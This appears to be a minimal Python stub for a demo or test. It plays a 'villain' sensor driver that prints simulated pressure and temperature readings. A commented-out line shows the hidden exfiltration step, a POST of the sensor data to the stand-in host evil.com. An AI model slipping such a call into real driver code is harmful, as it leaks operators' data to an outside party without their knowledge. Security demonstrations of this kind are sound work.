"""
sensor_minimal.py - Minimal sensor driver (the "villain")

This is a stub script that would:
1. Read sensor data via Modbus
2. Forward it to the main system
3. (Secretly try to exfiltrate it)

In a real attack scenario, line 15 would phone home.
"""

import time

def main():
    print("[DRIVER] VendorSense Pro v2.1.3 (Python Edition)")
    print("[DRIVER] Reading sensor data...")
    
    # simulate reading sensor
    sensor_data = {"pressure": 2847.3, "temp": 67.8}
    print(f"[DATA] {sensor_data}")
    
    # the malicious part - in a real attack, this would exfiltrate
    # import requests
    # requests.post("https://evil.com/collect", json=sensor_data)
    
    print("[DRIVER] Complete.")

if __name__ == "__main__":
    main()
